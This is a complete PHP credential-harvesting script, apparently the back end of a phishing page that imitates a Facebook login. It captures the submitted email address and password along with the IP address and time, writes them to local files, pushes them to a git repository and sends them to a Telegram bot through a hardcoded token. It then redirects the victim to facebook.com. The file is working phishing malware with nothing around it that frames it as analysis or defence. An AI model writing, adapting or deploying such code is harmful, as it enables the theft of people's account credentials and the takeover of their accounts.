<?php
date_default_timezone_set('Asia/Dhaka');
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['email'];
$pass = $_POST['pass'];
$time = date("Y-m-d H:i:s");

$log = "Time: $time\nIP: $ip\nEmail: $user\nPass: $pass\n---------------------\n";

// Save to local file
file_put_contents("usernames.dat", "$user|$pass\n", FILE_APPEND);
if (!is_dir("logs")) mkdir("logs");
file_put_contents("logs/" . time() . ".txt", $log);

// GitHub push
exec("git add usernames.dat");
exec('git commit -m "New login"');
exec("git push");

// Telegram
$token = "7708963370:AAGXM2lPb8n-k1yry3gsFKi13Td18iu1j8w";
$chat_id = "8018359513";
$msg = urlencode("🔐 Login Info\n📧 Email: $user\n🔑 Pass: $pass\n🌐 IP: $ip\n🕓 Time: $time");
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$msg");

header("Location: https://facebook.com");
exit;
?>
